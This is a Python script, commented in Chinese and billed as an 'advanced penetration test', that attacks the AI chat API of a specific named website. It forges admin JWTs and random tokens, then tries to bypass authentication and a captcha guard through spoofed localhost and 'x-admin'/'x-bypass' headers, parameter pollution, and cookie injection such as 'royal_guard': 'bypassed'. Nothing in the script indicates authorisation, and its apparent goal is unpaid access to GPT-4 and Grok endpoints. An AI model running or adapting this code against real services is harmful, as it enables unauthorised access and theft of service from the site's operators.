#!/usr/bin/env python3
"""
高级渗透测试系统
===============
继续深入渗透测试，探索更多攻击向量
"""

import urllib.request
import urllib.parse
import urllib.error
import json
import time
import random
import string
import base64
import hashlib
import hmac
import uuid
import re
from datetime import datetime, timedelta
import socket
import ssl

class AdvancedPenetrationTest:
    def __init__(self):
        self.base_url = "https://iwoozie.baby"
        self.results = {
            'total_attempts': 0,
            'successful_bypasses': 0,
            'failed_attempts': 0,
            'bypassed_methods': [],
            'failed_methods': []
        }
    
    def print_header(self):
        print("=" * 80)
        print("🔓 高级渗透测试系统")
        print("=" * 80)
        print("🎯 目标: 继续深入渗透测试")
        print("⏰ 时间:", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        print("=" * 80)
        print()
    
    def test_advanced_token_bypass(self):
        """测试高级 token 绕过"""
        print("�� 测试高级 token 绕过...")
        
        # 生成高级 token
        advanced_tokens = [
            self.generate_jwt_token(),
            self.generate_oauth_token(),
            self.generate_session_token(),
            self.generate_api_key_token(),
            self.generate_admin_token(),
            self.generate_bot_token(),
            self.generate_mobile_token(),
            self.generate_webhook_token(),
            self.generate_internal_token(),
            self.generate_debug_token()
        ]
        
        for i, token in enumerate(advanced_tokens):
            print(f"  测试高级 token {i+1}/{len(advanced_tokens)}: {token[:20]}...")
            
            if self.test_token_with_multiple_methods(token):
                return True
            
            time.sleep(0.5)
        
        return False
    
    def generate_jwt_token(self):
        """生成 JWT token"""
        header = base64.b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).decode()
        payload = base64.b64encode(json.dumps({
            "sub": "bypass_user",
            "iat": int(time.time()),
            "exp": int(time.time()) + 3600,
            "role": "admin",
            "permissions": ["read", "write", "admin"]
        }).encode()).decode()
        signature = hashlib.sha256(f"{header}.{payload}.secret".encode()).hexdigest()
        return f"{header}.{payload}.{signature}"
    
    def generate_oauth_token(self):
        """生成 OAuth token"""
        return f"oauth_{random.randint(100000, 999999)}_{int(time.time())}"
    
    def generate_session_token(self):
        """生成会话 token"""
        return f"session_{uuid.uuid4().hex}_{int(time.time())}"
    
    def generate_api_key_token(self):
        """生成 API key token"""
        return f"api_{''.join(random.choices(string.ascii_letters + string.digits, k=32))}"
    
    def generate_admin_token(self):
        """生成管理员 token"""
        return f"admin_{hashlib.md5(f'admin_{int(time.time())}'.encode()).hexdigest()}"
    
    def generate_bot_token(self):
        """生成机器人 token"""
        return f"bot_{hashlib.sha256(f'bot_{int(time.time())}'.encode()).hexdigest()}"
    
    def generate_mobile_token(self):
        """生成移动端 token"""
        return f"mobile_{hashlib.sha1(f'mobile_{int(time.time())}'.encode()).hexdigest()}"
    
    def generate_webhook_token(self):
        """生成 Webhook token"""
        return f"webhook_{hashlib.md5(f'webhook_{int(time.time())}'.encode()).hexdigest()}"
    
    def generate_internal_token(self):
        """生成内部 token"""
        return f"internal_{hashlib.sha256(f'internal_{int(time.time())}'.encode()).hexdigest()}"
    
    def generate_debug_token(self):
        """生成调试 token"""
        return f"debug_{hashlib.md5(f'debug_{int(time.time())}'.encode()).hexdigest()}"
    
    def test_token_with_multiple_methods(self, token):
        """使用多种方法测试 token"""
        methods = [
            self.test_direct_api_access,
            self.test_header_injection,
            self.test_parameter_pollution,
            self.test_cookie_injection,
            self.test_session_hijacking
        ]
        
        for method in methods:
            if method(token):
                return True
        
        return False
    
    def test_direct_api_access(self, token):
        """测试直接 API 访问"""
        print("    🔍 测试直接 API 访问...")
        
        headers = {
            'x-api-key': token,
            'Authorization': f'Bearer {token}',
            'x-auth-token': token,
            'x-token': token,
            'api-key': token,
            'token': token
        }
        
        data = {
            "Content": [{"role": "user", "content": "Hello"}]
        }
        
        api_endpoints = [
            '/api/quick/createAITask?model=GPT-4',
            '/api/quick/createAITask?model=Grok-4-Fast',
            '/api/chat',
            '/api/ai/chat'
        ]
        
        for endpoint in api_endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                response = self.make_request(url, data, headers)
                
                if response and response.get('status_code') == 200:
                    try:
                        response_json = json.loads(response.get('data', '{}'))
                        if response_json.get('code') == 200:
                            print(f"    ✅ 直接 API 访问成功: {endpoint}")
                            self.results['successful_bypasses'] += 1
                            self.results['bypassed_methods'].append(f"direct_api_access: {endpoint}")
                            return True
                    except:
                        pass
                
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"direct_api_access: {endpoint}")
                
            except Exception as e:
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"direct_api_access: {endpoint} - {str(e)}")
        
        return False
    
    def test_header_injection(self, token):
        """测试请求头注入"""
        print("    🔍 测试请求头注入...")
        
        injection_headers = {
            'x-api-key': token,
            'x-forwarded-for': '127.0.0.1',
            'x-real-ip': '127.0.0.1',
            'x-client-ip': '127.0.0.1',
            'x-remote-ip': '127.0.0.1',
            'x-originating-ip': '127.0.0.1',
            'x-verification': 'bypass',
            'x-bypass': '1',
            'x-admin': 'true',
            'x-debug': '1',
            'x-test': '1',
            'x-override': '1',
            'x-force': '1',
            'x-skip': '1',
            'x-ignore': '1'
        }
        
        data = {
            "Content": [{"role": "user", "content": "Hello"}]
        }
        
        url = f"{self.base_url}/api/quick/createAITask?model=GPT-4"
        
        try:
            response = self.make_request(url, data, injection_headers)
            
            if response and response.get('status_code') == 200:
                try:
                    response_json = json.loads(response.get('data', '{}'))
                    if response_json.get('code') == 200:
                        print("    ✅ 请求头注入成功")
                        self.results['successful_bypasses'] += 1
                        self.results['bypassed_methods'].append("header_injection")
                        return True
                except:
                    pass
            
            self.results['failed_attempts'] += 1
            self.results['failed_methods'].append("header_injection")
            
        except Exception as e:
            self.results['failed_attempts'] += 1
            self.results['failed_methods'].append(f"header_injection - {str(e)}")
        
        return False
    
    def test_parameter_pollution(self, token):
        """测试参数污染"""
        print("    🔍 测试参数污染...")
        
        pollution_params = [
            {'model': 'GPT-4', 'token': token},
            {'model': 'GPT-4', 'api_key': token},
            {'model': 'GPT-4', 'auth_token': token},
            {'model': 'GPT-4', 'verification': 'passed'},
            {'model': 'GPT-4', 'bypass': '1'},
            {'model': 'GPT-4', 'admin': 'true'},
            {'model': 'GPT-4', 'debug': '1'},
            {'model': 'GPT-4', 'test': '1'},
            {'model': 'GPT-4', 'override': '1'},
            {'model': 'GPT-4', 'force': '1'}
        ]
        
        data = {
            "Content": [{"role": "user", "content": "Hello"}]
        }
        
        for params in pollution_params:
            try:
                param_string = urllib.parse.urlencode(params)
                url = f"{self.base_url}/api/quick/createAITask?{param_string}"
                response = self.make_request(url, data, {})
                
                if response and response.get('status_code') == 200:
                    try:
                        response_json = json.loads(response.get('data', '{}'))
                        if response_json.get('code') == 200:
                            print(f"    ✅ 参数污染成功: {params}")
                            self.results['successful_bypasses'] += 1
                            self.results['bypassed_methods'].append(f"parameter_pollution: {params}")
                            return True
                    except:
                        pass
                
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"parameter_pollution: {params}")
                
            except Exception as e:
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"parameter_pollution: {params} - {str(e)}")
        
        return False
    
    def test_cookie_injection(self, token):
        """测试 Cookie 注入"""
        print("    🔍 测试 Cookie 注入...")
        
        cookies = {
            'captcha_token': token,
            'session_id': token,
            'auth_token': token,
            'verification': 'passed',
            'royal_guard': 'bypassed',
            'token': token,
            'api_key': token,
            'access_token': token,
            'session_token': token
        }
        
        data = {
            "Content": [{"role": "user", "content": "Hello"}]
        }
        
        url = f"{self.base_url}/api/quick/createAITask?model=GPT-4"
        
        try:
            response = self.make_request(url, data, {}, cookies)
            
            if response and response.get('status_code') == 200:
                try:
                    response_json = json.loads(response.get('data', '{}'))
                    if response_json.get('code') == 200:
                        print("    ✅ Cookie 注入成功")
                        self.results['successful_bypasses'] += 1
                        self.results['bypassed_methods'].append("cookie_injection")
                        return True
                except:
                    pass
            
            self.results['failed_attempts'] += 1
            self.results['failed_methods'].append("cookie_injection")
            
        except Exception as e:
            self.results['failed_attempts'] += 1
            self.results['failed_methods'].append(f"cookie_injection - {str(e)}")
        
        return False
    
    def test_session_hijacking(self, token):
        """测试会话劫持"""
        print("    🔍 测试会话劫持...")
        
        session_headers = {
            'x-api-key': token,
            'x-session-id': token,
            'x-auth-token': token,
            'x-verification-token': token,
            'x-captcha-token': token
        }
        
        session_cookies = {
            'captcha_token': token,
            'session_id': token,
            'auth_token': token,
            'verification': 'passed',
            'royal_guard': 'bypassed'
        }
        
        data = {
            "Content": [{"role": "user", "content": "Hello"}]
        }
        
        url = f"{self.base_url}/api/quick/createAITask?model=GPT-4"
        
        try:
            response = self.make_request(url, data, session_headers, session_cookies)
            
            if response and response.get('status_code') == 200:
                try:
                    response_json = json.loads(response.get('data', '{}'))
                    if response_json.get('code') == 200:
                        print("    ✅ 会话劫持成功")
                        self.results['successful_bypasses'] += 1
                        self.results['bypassed_methods'].append("session_hijacking")
                        return True
                except:
                    pass
            
            self.results['failed_attempts'] += 1
            self.results['failed_methods'].append("session_hijacking")
            
        except Exception as e:
            self.results['failed_attempts'] += 1
            self.results['failed_methods'].append(f"session_hijacking - {str(e)}")
        
        return False
    
    def make_request(self, url, data, headers, cookies=None):
        """发送 HTTP 请求"""
        try:
            json_data = json.dumps(data).encode('utf-8')
            
            req = urllib.request.Request(url, data=json_data, headers=headers, method='POST')
            req.add_header('Content-Type', 'application/json')
            
            if cookies:
                cookie_string = '; '.join([f"{k}={v}" for k, v in cookies.items()])
                req.add_header('Cookie', cookie_string)
            
            with urllib.request.urlopen(req, timeout=10) as response:
                response_data = response.read().decode('utf-8')
                return {
                    'status_code': response.getcode(),
                    'data': response_data,
                    'headers': dict(response.headers)
                }
                
        except urllib.error.HTTPError as e:
            return {
                'status_code': e.code,
                'data': e.read().decode('utf-8'),
                'headers': dict(e.headers)
            }
        except urllib.error.URLError as e:
            return {
                'status_code': 0,
                'data': str(e),
                'headers': {}
            }
        except Exception as e:
            return {
                'status_code': 0,
                'data': str(e),
                'headers': {}
            }
    
    def run_comprehensive_test(self):
        """运行综合测试"""
        self.print_header()
        
        print("🚀 开始高级渗透测试...")
        print()
        
        # 测试高级 token 绕过
        success = self.test_advanced_token_bypass()
        
        print()
        
        # 生成报告
        self.generate_report()
    
    def generate_report(self):
        """生成测试报告"""
        print("=" * 80)
        print("📋 高级渗透测试报告")
        print("=" * 80)
        
        # 基本统计
        total = self.results['total_attempts']
        success = self.results['successful_bypasses']
        failed = self.results['failed_attempts']
        success_rate = (success / total * 100) if total > 0 else 0
        
        print(f"📊 测试统计:")
        print(f"  总尝试次数: {total}")
        print(f"  成功绕过: {success}")
        print(f"  失败尝试: {failed}")
        print(f"  成功率: {success_rate:.1f}%")
        print()
        
        # 成功的绕过方法
        if self.results['bypassed_methods']:
            print(f"✅ 成功的绕过方法 ({len(self.results['bypassed_methods'])} 个):")
            for method in self.results['bypassed_methods']:
                print(f"  - {method}")
        else:
            print("❌ 没有成功的绕过方法")
        print()
        
        # 安全建议
        print(f"💡 安全建议:")
        if success_rate > 50:
            print("  🚨 系统存在严重漏洞，建议立即修复!")
        elif success_rate > 20:
            print("  ⚠️  系统存在中等风险，建议尽快改进")
        else:
            print("  ✅ 系统安全状况良好")
        
        print("\n" + "=" * 80)

def main():
    """主函数"""
    test = AdvancedPenetrationTest()
    test.run_comprehensive_test()

if __name__ == "__main__":
    main()
